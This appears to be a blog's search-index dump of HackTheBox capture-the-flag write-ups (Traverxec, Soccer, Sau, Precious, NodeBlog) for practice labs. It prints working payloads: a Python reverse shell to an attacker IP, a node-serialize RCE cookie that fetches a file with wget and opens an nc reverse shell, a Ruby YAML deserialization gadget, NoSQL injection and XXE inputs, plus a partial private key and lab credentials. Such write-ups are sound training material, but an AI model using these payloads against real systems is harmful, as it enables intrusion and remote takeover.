xafe81v6l6RM8s9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/UrGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AXJPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5LhhORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQufSP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOMj1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469ttVeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w]-----END RSA PRIVATE KEY-----www-data@traverxec:/tmp/Data/home/david/.ssh$```{: .nolineno}Lets see the paraphrase of `id_rsa` from cracking it through `john the ripper` â†’![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%204.png)Lets try the SSH login now with password and private key too â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ ssh david@traverxec.htb -i id_rsaEnter passphrase for key 'id_rsa': Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64david@traverxec:~$ ls -altotal 36drwx--x--x 5 david david 4096 Oct 25 2019 .drwxr-xr-x 3 root root 4096 Oct 25 2019 ..lrwxrwxrwx 1 root root 9 Oct 25 2019 .bash_history -> /dev/null-rw-r--r-- 1 david david 220 Oct 25 2019 .bash_logout-rw-r--r-- 1 david david 3526 Oct 25 2019 .bashrcdrwx------ 2 david david 4096 Oct 25 2019 bin-rw-r--r-- 1 david david 807 Oct 25 2019 .profiledrwxr-xr-x 3 david david 4096 Oct 25 2019 public_wwwdrwx------ 2 david david 4096 Oct 25 2019 .ssh-r--r----- 1 root david 33 Jul 21 00:14 user.txtdavid@traverxec:~$ cat user.txt44321fe1b9364d36aee2333a9ccb0715david@traverxec:~$```{: .nolineno}Now I find the version of sudo outdated so I tried this exploit directly and I got what I wanted â†’[exploit_nss.py File](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)```bashwww-data@traverxec:/$ sudo -VSudo version 1.8.27Sudoers policy plugin version 1.8.27Sudoers file grammar version 46Sudoers I/O plugin version 1.8.27www-data@traverxec:/$```{: .nolineno}```bashdavid@traverxec:/tmp$ python exploit.py# /bin/bash -iroot@traverxec:/tmp# whoamirootroot@traverxec:/tmp# iduid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(david)root@traverxec:/tmp# cd /rootroot@traverxec:/root# ls -altotal 64drwx------ 3 root root 4096 Nov 12 2019 .drwxr-xr-x 18 root root 4096 Sep 16 2022 ..lrwxrwxrwx 1 root root 9 Oct 25 2019 .bash_history -> /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Nov 12 2019 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 37520 Oct 25 2019 nostromo_1.9.6-1.deb-r-------- 1 root root 33 Jul 21 00:14 root.txtroot@traverxec:/root# cat root.txtf0310cddcfa7d2fa7927fead112c5bf3root@traverxec:/root#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Soccer", "url": "/posts/Soccer/", "categories": "HackTheBox", "tags": "CMS, PrivEsc, Public Exploit, SQLi, subdomain", "date": "2023-09-01 00:00:00 +0530", "snippet": "```bashnano /etc/hosts 10.10.11.194 soccer.htb```{: .nolineno}## **PORT Scan â¤µï¸**![Untitled](/Vulnhub-Files/img/Soccer/Untitled.png)```bashsudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.1...", "content": "```bashnano /etc/hosts 10.10.11.194 soccer.htb```{: .nolineno}## **PORT Scan â¤µï¸**![Untitled](/Vulnhub-Files/img/Soccer/Untitled.png)```bashsudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.194PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=| 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=| 256 5797565def793c2fcbdb35fff17c615c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http:/soccer.htb/| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)9091/tcp open xmltec-xmlmail?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request| Connection: close| GetRequest: | HTTP/1.1 404 Not Found| Content-Security-Policy: default-src 'none'| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 139| Date: Thu, 13 Apr 2023 15:50:21 GMT| Connection: close| | | | | Error| | | Cannot GET /| | | HTTPOptions, RTSPRequest: | HTTP/1.1 404 Not Found| Content-Security-Policy: default-src 'none'| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 143| Date: Thu, 13 Apr 2023 15:50:22 GMT| Connection: close| | | | | Error| | | Cannot OPTIONS /| |_ ```{: .nolineno}## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/Soccer/Untitled%201.png)From directory or files bruteforcing I got to know about directory /tiny and /tiny/uploads .![Untitled](/Vulnhub-Files/img/Soccer/Untitled%202.png)So while Recon I got the Tiny File Manager version >![Untitled](/Vulnhub-Files/img/Soccer/Untitled%203.png)And I found something on searchsploit also about Tiny File Manager âž¡ï¸Now with default Credentials like > admin : admin@123 I got in âž¡ï¸![Untitled](/Vulnhub-Files/img/Soccer/Untitled%204.png)So lets try to upload the reverse shell Now .![Untitled](/Vulnhub-Files/img/Soccer/Untitled%205.png)Now After uploading the reverse shell file I got the shell â¤µï¸![Untitled](/Vulnhub-Files/img/Soccer/Untitled%206.png)I got something from **tinyfilemanager.php** >![Untitled](/Vulnhub-Files/img/Soccer/Untitled%207.png)Now after so much recon I found a subdomain â¤µï¸![Untitled](/Vulnhub-Files/img/Soccer/Untitled%208.png)Now lets set the /etc/hosts file >>![Untitled](/Vulnhub-Files/img/Soccer/Untitled%209.png)![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2010.png)Now after Signing up I got logged in and got this â€”> ![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2011.png)Now After Looking into the source code >![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2012.png)I got to know that this site is vulnerable to SQLi and also related with websocket so lets research about it .![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2013.png)So From this site we are performing these steps to capture our output â¤µï¸ ![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2014.png)Now first run that python3 script which we got from this [**site**](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html/) > ![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2015.png)Now I got this >>+------+-------------------+----------+----------------------+| id | email | username | password |+------+-------------------+----------+----------------------+| 1324 | player@player.htb | player | PlayerOftheMatch2022 |+------+-------------------+----------+----------------------+```bashCredentails >player : PlayerOftheMatch2022```{: .nolineno}Now lets login into player user .![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2016.png)```bashplayer@soccer:~$ cat user.txtcat user.txt38bba6d79100041daf683a4911ffe3e9player@soccer:~$```{: .nolineno}Looking into the SUIDS I got to know about **daos** so I followed this > [**LINK**](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/)![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2017.png)So I created a File named as â€œ**dstat_.pyâ€** which contains the python reverse shell code .Now copy this into '/usr/local/share/dstat'. Time to start netcat listener.![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2018.png)```bashcommand : doas /usr/bin/dstat --```{: .nolineno}![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2019.png)Finally got Root !!![Untitled](/Vulnhub-Files/img/Soccer/Untitled%2020.png)```bash# cat root.txtb86ac8558e5bb1aee4a830773c76d81a```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sau", "url": "/posts/Sau/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit, SSRF", "date": "2023-09-01 00:00:00 +0530", "snippet": "![Untitled](/Vulnhub-Files/img/Sau/Untitled.png)## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sau]â””â”€$ sudo nmap -sC -sV -T4 10.10.11.224 -oN Nmap_results.txt[sudo] password for kali...", "content": "![Untitled](/Vulnhub-Files/img/Sau/Untitled.png)## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sau]â””â”€$ sudo nmap -sC -sV -T4 10.10.11.224 -oN Nmap_results.txt[sudo] password for kali: Starting Nmap 7.94 ( https:/nmap.org ) at 2023-08-29 12:45 ISTNmap scan report for 10.10.11.224Host is up (0.17s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)| 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)|_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)80/tcp filtered http55555/tcp open unknown| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request| Content-Type: text/plain; charset=utf-8| X-Content-Type-Options: nosniff| Date: Tue, 29 Aug 2023 07:17:19 GMT| Content-Length: 75| invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$| GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 302 Found| Content-Type: text/html; charset=utf-8| Location: /web| Date: Tue, 29 Aug 2023 07:16:43 GMT| Content-Length: 27| href=\"/web\">Found.| HTTPOptions: | HTTP/1.0 200 OK| Allow: GET, OPTIONS| Date: Tue, 29 Aug 2023 07:16:45 GMT|_ Content-Length: 01 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Sau/Untitled%201.png)After clicking on create button â†’![Untitled](/Vulnhub-Files/img/Sau/Untitled%202.png)```bashBasket 'nxhtzfm' is successfully created!Your token is: 8fREKdr_kiHy5fuFJce3w5JPrnQ5zlnnhzTVJ4CUo62O```{: .nolineno}I got a dashboard which keeps log of the URL activity â†’![Untitled](/Vulnhub-Files/img/Sau/Untitled%203.png)Through web recon I got to know about the vulberability that this site is affected to so I got this â†’[Exploit](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3/)Now I set the options and all the Settings options through curl with the new directory named as `shell` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sau]â””â”€$ curl --location 'http:/10.10.11.224:55555/api/baskets/shell' --header 'Content-Type: application/json' --data '{\"forward_url\": \"http:/127.0.0.1:80/\", \"proxy_response\": true, \"insecure_tls\": false, \"expand_path\": true, \"capacity\": 250}'{\"token\":\"ZLVtatdn0yuct7Sy8iOpI9t0VryjYQL68vTkd-TX8HMT\"}```{: .nolineno}I accessed the `http:/10.10.11.224:55555/api/baskets/shell` page I got this ![Untitled](/Vulnhub-Files/img/Sau/Untitled%204.png)I also tried to set these below options on curl â†’![Untitled](/Vulnhub-Files/img/Sau/Untitled%205.png)Now Lets access the url directly `http:/10.10.11.224:55555/shell`and I got this â†’![Untitled](/Vulnhub-Files/img/Sau/Untitled%206.png)Now with some web recon I find out that this `Mailtrail (v0.53)` is vulnerable and can give me RCE so I used this exploit â†’[Exploit](https://www.exploit-db.com/exploits/51676/)![Untitled](/Vulnhub-Files/img/Sau/Untitled%207.png)I got the shell now its time for dig in into the shell for root access â†’```bashpuma@sau:~$ ls -alls -altotal 36drwxr-xr-x 4 puma puma 4096 Aug 29 05:24 .drwxr-xr-x 3 root root 4096 Apr 15 09:17 ..lrwxrwxrwx 1 root root 9 Apr 14 17:46 .bash_history -> /dev/null-rw-r--r-- 1 puma puma 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 puma puma 3771 Feb 25 2020 .bashrcdrwx------ 2 puma puma 4096 Apr 15 09:42 .cachedrwx------ 3 puma puma 4096 Apr 15 09:51 .gnupg-rw-r--r-- 1 puma puma 807 Feb 25 2020 .profile-rw------- 1 puma puma 556 Aug 29 05:24 .viminfolrwxrwxrwx 1 puma puma 9 Apr 15 09:41 .wget-hsts -> /dev/null-rw-r----- 1 root puma 33 Aug 29 04:08 user.txtpuma@sau:~$ cat user.txtcat user.txt9d18067025cba80f61b19105560f6662puma@sau:~$ ```{: .nolineno}Now lets see how this user can get me to root â†’```bashpuma@sau:~$ sudo -lsudo -lMatching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.servicepuma@sau:~$```{: .nolineno}Now from gtfobin site I got the payload that gona get me root â†’![Untitled](/Vulnhub-Files/img/Sau/Untitled%208.png)Now I used it and got this â†’```bashpuma@sau:~$ sudo /usr/bin/systemctl status trail.service```{: .nolineno}![Untitled](/Vulnhub-Files/img/Sau/Untitled%209.png)```bash# cd /root# ls -altotal 44drwx------ 6 root root 4096 Aug 29 09:58 .drwxr-xr-x 20 root root 4096 Jun 19 09:41 ..lrwxrwxrwx 1 root root 9 Apr 15 09:35 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 3 root root 4096 Jun 19 09:41 .cache-rw------- 1 root root 31 Aug 29 09:58 .lesshstdrwxr-xr-x 3 root root 4096 Jun 8 11:03 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwx------ 2 root root 4096 Apr 14 17:38 .ssh-rw-r--r-- 1 root root 39 Jun 8 11:05 .vimrclrwxrwxrwx 1 root root 9 Apr 15 09:35 .wget-hsts -> /dev/nulldrwxr-xr-x 4 root root 4096 Jun 19 09:41 go-rw-r----- 1 root root 33 Aug 29 04:08 root.txt## cat root.txt2754674b979d814022ef84fa0cdd965b#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Precious", "url": "/posts/Precious/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit", "date": "2023-09-01 00:00:00 +0530", "snippet": "```jsx IP : 10.10.11.189sudo nano /etc/hosts10.10.11.189 precious.htb```{: .nolineno}## PORT SCAN RESULTS âž¡ï¸![Untitled](/Vulnhub-Files/img/Precious/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Download...", "content": "```jsx IP : 10.10.11.189sudo nano /etc/hosts10.10.11.189 precious.htb```{: .nolineno}## PORT SCAN RESULTS âž¡ï¸![Untitled](/Vulnhub-Files/img/Precious/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Precious]â””â”€$ **sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.189**Starting Nmap 7.93 ( https:/nmap.org ) at 2023-04-15 12:14 ISTNmap scan report for 10.10.11.189Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA)| 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)|_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http:/precious.htb/|_http-server-header: nginx/1.18.0Service Info: ; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeartion âž¡ï¸![Untitled](/Vulnhub-Files/img/Precious/Untitled%201.png)Now on Burpsuite I got the pdf Generation version and Name >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%202.png)Since it is using `pdfkit v0.8.6` to generate pdfs So I dig into it and I found that this version is vulnerable > ![Untitled](/Vulnhub-Files/img/Precious/Untitled%203.png)It leads us to Link : [Exploit](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795/)After reading the `POC` I got to known that we can use any get `parameter` name and inside that use the `backticks` to injection our command.```bashhttp:/:/?name=%20 `id(command)````{: .nolineno}Now lets try it out now âž¡ï¸![Untitled](/Vulnhub-Files/img/Precious/Untitled%204.png)And it generated the pdf with results >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%205.png)So lets try for reverse shell now â¤µï¸```bashhttp:/10.10.14.33:8888/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.33\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'````{: .nolineno}![Untitled](/Vulnhub-Files/img/Precious/Untitled%206.png)I got this >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%207.png)Now lets Login into henry â¤µï¸```jsxhenry : **Q3c1AqGHtoI0aXAYFH**```{: .nolineno}![Untitled](/Vulnhub-Files/img/Precious/Untitled%208.png)![Untitled](/Vulnhub-Files/img/Precious/Untitled%209.png)Now lets see how to get to root >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%2010.png)Now letâ€™s see what is inside this **update_dependencies.rb** file >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%2011.png)It is loading this dependencies.yml file >>```bashbash-5.1$ cat dependencies.yml]---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \"abc\" debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: \"chmod +s /bin/bash\" method_id: :resolvebash-5.1$```{: .nolineno}Now I know that the /bin/bash permissions are changed so lets exploit it >>![Untitled](/Vulnhub-Files/img/Precious/Untitled%2012.png)![Untitled](/Vulnhub-Files/img/Precious/Untitled%2013.png)Lets see the flag now â¤µï¸![Untitled](/Vulnhub-Files/img/Precious/Untitled%2014.png)> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Nodeblog", "url": "/posts/NodeBlog/", "categories": "HackTheBox", "tags": "Deserialization, Mongo, NoSQL, PrivEsc, XXE", "date": "2023-09-01 00:00:00 +0530", "snippet": "### Lets see the IP address â†’```bashIP : 10.10.11.139```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/NodeBlog]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10....", "content": "### Lets see the IP address â†’```bashIP : 10.10.11.139```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/NodeBlog]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.139Nmap scan report for 10.10.11.139Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)| 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)|_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)5000/tcp open http Node.js (Express middleware)|_http-title: BlogService Info: ; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Lets check port 5000 â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled.png)Now lets see the login page â†’Lets check for `NoSQL Injection` and change the content-type to `application/json` â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%201.png)```bashContent-Type: application/jsonin JSON{\"user\": {\"$ne\": null}, \"password\": {\"$ne\": null}}```{: .nolineno}Now lets see the output of it â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%202.png)I tried uploading the php_reverse_shell.php file but I got this error so I suppse I need to try XXE here as a payload â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%203.png)Now I uploaded this file.xml file in outcome to that I got this â†’```bash]>\t/etc/passwd\t\tThis XML payload load es /etc/passwd file.\t&test;```{: .nolineno}![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%204.png)In response to that I got this â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%205.png)Now I got this server.js file on this location â†’ `/opt/blog/server.js` after that I decoded with cyberchef with `From HTML Entity` â†’```bashconst express = require('express')const mongoose = require('mongoose')const Article = require('./models/article')const articleRouter = require('./routes/articles')const loginRouter = require('./routes/login')const serialize = require('node-serialize')const methodOverride = require('method-override')const fileUpload = require('express-fileupload')const cookieParser = require('cookie-parser');const crypto = require('crypto')const cookie_secret = \"UHC-SecretCookie\"/var session = require('express-session');const app = express()mongoose.connect('mongodb:/localhost/blog')app.set('view engine', 'ejs')app.use(express.urlencoded({ extended: false }))app.use(methodOverride('_method'))app.use(fileUpload())app.use(express.json());app.use(cookieParser());/app.use(session({secret: \"UHC-SecretKey-123\"}));function authenticated(c) { if (typeof c == 'undefined') return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){ return true } else { return false }}app.get('/', async (req, res) => { const articles = await Article.find().sort({ createdAt: 'desc' }) res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })})app.use('/articles', articleRouter)app.use('/login', loginRouter)app.listen(5000)```{: .nolineno}Here I found unserialization so Here I should find for Deseralization RCE so lets see What I find next â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%206.png)Lets use this Node Serealization payload here in cookie from [Payloads](https://book.hacktricks.xyz/pentesting-web/deserialization/) â†’```bash{\"rce\":\"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}\"}```{: .nolineno}For Verification I tried to upload my `php_reverse_shell.php` file here on system lets see we get the response or not â†’```bash{\"rce\":\"_$$ND_FUNC$$_function() {require('child_process').exec('wget http:/10.10.14.213:8000/shell.php', (error, stdout, stderr) => { console.log(stdout); }); } ()\"}```{: .nolineno}![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%207.png)Lets see the response for this upload through python3 http server â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%208.png)So this verify me that the payload is working here so lets use this payload for reverse shell â†’```bash{\"rce\":\"_$$ND_FUNC$$_function() {require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >/tmp/f', (error, stdout, stderr) => { console.log(stdout); }); } ()\"}```{: .nolineno}Lets access the home page and add this payload in cookies along with auth values â†’![Untitled](/Vulnhub-Files/img/NodeBlog/Untitled%209.png)Lets see the response here â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/NodeBlog]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.213] from (UNKNOWN) [10.10.11.139] 56480/bin/sh: 0: can not access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'To run a command as administrator (user \"root\"), use \"sudo \".See \"man sudo_root\" for details.bash: /home/admin/.bashrc: Permission deniedadmin@nodeblog:/opt/blog$admin@nodeblog:/opt/blog$ whoamiadminadmin@nodeblog:/opt/blog$ iduid=1000(admin) gid=1000(admin) groups=1000(admin)admin@nodeblog:/opt/blog$```{: .nolineno}## SHELL âž¡ï¸Now lets dig deeper â†’```bashadmin@nodeblog:/home$ cat admin/user.txtcat: admin/user.txt: Permission deniedadmin@nodeblog:/home$ chmod +x adminadmin@nodeblog:/home$ cd adminadmin@nodeblog:~$ ls -altotal 36drwxr-xr-x 1 admin admin 220 Jan 3 2022 .drwxr-xr-x 1 root root 10 Dec 27 2021 ..-rw------- 1 admin admin 1863 Dec 31 2021 .bash_history-rw-r--r-- 1 admin admin 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 admin admin 3771 Feb 25 2020 .bashrcdrwx------ 1 admin admin 40 Jul 2 2021 .cache-rw------- 1 admin admin 125 Dec 13 2021 .dbshell-rw------- 1 admin admin 0 Dec 13 2021 .mongorc.jsdrwxrwxr-x 1 admin admin 158 Jan 3 2022 .pm2-rw-r--r-- 1 admin admin 807 Feb 25 2020 .profile-rw-r--r-- 1 admin admin 0 Jul 2 2021 .sudo_as_admin_successful-rw------- 1 admin admin 10950 Jan 3 2022 .viminfo-rw-r--r-- 1 root root 33 Jul 26 08:26 user.txtadmin@nodeblog:~$ cat user.txtbe2762310e1a940d74f996f9d6dbf335admin@nodeblog:~$```{: .nolineno}Now lets access mongodb and the data inside it â†’```bashadmin@nodeblog:/dev/shm$ mongoMongoDB shell version v3.6.8connecting to: mongodb:/127.0.0.1:27017Implicit session: session { \"id\" : UUID(\"5e7d0d52-3790-469c-8552-312075db8411\") }MongoDB server version: 3.6.8Server has startup warnings: 2023-07-26T08:26:10.278+0000 I CONTROL [initandlisten] 2023-07-26T08:26:10.278+0000 I CONTROL [initandlisten] ** WARNING: Access control is not enabled for the database.2023-07-26T08:26:10.278+0000 I CONTROL [initandlisten] ** Read and write access to data and configuration is unrestricted.2023-07-26T08:26:10.278+0000 I CONTROL [initandlisten] > show dbsadmin 0.000GBblog 0.000GBconfig 0.000GBlocal 0.000GB> use localswitched to db local> show collectionsstartup_log> use blogswitched to db blog> show collectionsarticlesusers>```{: .nolineno}Here I found inside users table â†’```bash> db.users.find(){ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }>```{: .nolineno}Now lets use it to get to root â†’```bashadmin@nodeblog:~$ sudo -l[sudo] password for admin: Matching Defaults entries for admin on nodeblog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser admin may run the following commands on nodeblog: (ALL) ALL (ALL : ALL) ALLadmin@nodeblog:~$ sudo su -root@nodeblog:~# whoamirootroot@nodeblog:~# iduid=0(root) gid=0(root) groups=0(root)root@nodeblog:~# ls -altotal 60drwx------ 1 root root 162 Jan 4 2022 .drwxr-xr-x 1 root root 180 Dec 27 2021 ..-rw------- 1 root root 10687 Jan 4 2022 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 1 root root 56 Jan 4 2022 